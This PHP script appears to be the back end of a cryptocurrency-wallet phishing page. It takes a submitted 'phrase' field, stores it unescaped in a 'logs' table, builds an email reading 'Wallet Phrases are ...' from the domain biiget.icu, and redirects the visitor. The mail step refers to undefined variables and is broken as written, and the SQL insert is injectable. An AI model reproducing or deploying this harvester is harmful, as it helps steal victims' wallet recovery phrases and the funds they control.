<?php session_start();
require_once('dbconnection.php');

//Code for Registration
if(isset($_POST['connect']))
{
	$phrase=$_POST['phrase'];
$msg=mysqli_query($con,"insert into logs(phrase)values('$phrase')");
$subject = "NEW LOGS";
$recipient = "support@biiget.icu";
$message = "Wallet Phrases are ". $pin;
mail($email, $subject, $message, "From: $recipient");
    echo"<script>window.location.href='index-2.html';
</script>";
}
?>
